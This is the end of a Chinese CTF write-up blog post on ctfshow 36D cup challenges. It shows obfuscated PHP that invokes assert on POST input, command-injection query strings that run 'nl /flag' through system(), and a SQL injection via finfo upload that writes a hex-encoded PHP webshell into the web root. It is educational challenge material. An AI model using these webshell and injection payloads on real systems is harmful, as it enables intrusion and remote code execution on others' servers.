class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$____</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">/*ASSERT</span></span><br><span class="line"><span class="comment">_POST</span></span><br><span class="line"><span class="comment">$_POST</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>也可以用<code>$_</code>数组进行变量拼接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=`<span class="variable">$_</span>[12]<span class="variable">$_</span>[13] /*`  --&gt; `<span class="built_in">nl</span> /*`</span><br><span class="line">?code=`<span class="variable">$_</span>[12]<span class="variable">$_</span>[13] /<span class="variable">$_</span>[5]<span class="variable">$_</span>[13]<span class="variable">$_</span>[0]<span class="variable">$_</span>[6]`  --&gt; `<span class="built_in">nl</span> /flag`</span><br><span class="line">?code=1);<span class="variable">$__</span>=<span class="variable">$_</span>[18].<span class="variable">$_</span>[24].<span class="variable">$_</span>[18].<span class="variable">$_</span>[19].<span class="variable">$_</span>[4].<span class="variable">$_</span>[11];<span class="variable">$__</span>(<span class="string">&quot;<span class="variable">$_</span>[12]<span class="variable">$_</span>[13] /<span class="variable">$_</span>[5]<span class="variable">$_</span>[13]<span class="variable">$_</span>[0]<span class="variable">$_</span>[6]&quot;</span>);(1  --&gt; 1);system(<span class="string">&quot;nl /flag&quot;</span>);(1</span><br></pre></td></tr></table></figure>

<h2 id="你没见过的注入"><a href="#你没见过的注入" class="headerlink" title="你没见过的注入"></a>你没见过的注入</h2><h3 id="finfo文件注入"><a href="#finfo文件注入" class="headerlink" title="#finfo文件注入"></a>#finfo文件注入</h3><p>访问robots.txt拿到&#x2F;pwdreset.php，重置密码后登录admin账户</p>
<p>文件上传</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>64a7c934-f07a-4c12-b004-51026198fba1.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>297</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;136&quot;, &quot;Google Chrome&quot;;v=&quot;136&quot;, &quot;Not.A/Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://64a7c934-f07a-4c12-b004-51026198fba1.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryFoKgAPnn4CStanW0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://64a7c934-f07a-4c12-b004-51026198fba1.challenge.ctf.show/main.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8; PHPSESSID=pshlu9hjnvd3t669rp84ggf97l</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryFoKgAPnn4CStanW0</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.txt&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: text/plain</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryFoKgAPnn4CStanW0</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Submit</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryFoKgAPnn4CStanW0--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure>

<p>上传后在filelist.php页面查看文件，发现这里很像之前web224做的一个finfo的文件注入，所以我们传入</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C64File&quot;&#x27;);<span class="keyword">select</span> <span class="number">0x3c3f3d60245f4745545b315d603f3e</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/1.php&#x27;</span>;--+</span><br><span class="line">0x3c3f3d60245f4745545b315d603f3e是&lt;?=`$_GET[1]`?&gt;的十六进制</span><br></pre></td></tr></table></figure>

<p>上传后访问1.php并进行RCE就行</p>
<p>看upload.php发现果然和之前的那道题是一样的</p>

    </div>

    
    
    
	
	<div>
	  
		
<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

	  
	</div>


    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>wanTh3flag
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://wanth3f1ag.top/2025/05/15/ctfshow36D%E7%BB%83%E6%89%8B%E8%B5%9B-36D%E6%9D%AF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" title="ctfshow36D练手赛+36D杯(已做完)">https://wanth3f1ag.top/2025/05/15/ctfshow36D练手赛-36D杯(已做完)/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/36D%E6%9D%AF/" rel="tag"># 36D杯</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/05/15/CVE-2024-2961%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="CVE-2024-2961漏洞复现">
                  <i class="fa fa-angle-left"></i> CVE-2024-2961漏洞复现
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/05/18/ctfshow%E6%96%B0%E6%89%8B%E6%9D%AF/" rel="next" title="ctfshow新手杯">
                  ctfshow新手杯 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">3.3m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">50:39</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
